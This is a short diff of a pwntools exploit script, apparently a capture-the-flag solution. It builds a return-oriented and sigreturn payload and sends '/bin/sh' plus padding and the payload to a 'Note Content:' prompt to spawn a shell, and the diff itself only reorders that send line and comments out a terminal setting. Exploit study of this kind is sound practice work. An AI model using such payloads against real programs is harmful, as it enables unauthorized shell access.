@@ -85,14 +85,14 @@ payload += p64(pop_rdi)
 payload += p64(0xf)
 payload += p64(syscall_plt)
 payload += bytes(frame2) 
-context.terminal = ['foot']
+# context.terminal = ['foot']
+p.sendafter(b'Note Content:',b'/bin/sh\0'+ b'a'*0x38 +payload )
 # gdb.attach(p, gdbscript='''        
 #            # b* 0x0000000000401bc2
 #            # b* 0x401070
 #            b*0x401b56           ''')
 #
 
-p.sendafter(b'Note Content:',b'/bin/sh\0'+ b'a'*0x38 +payload )
 
 
 
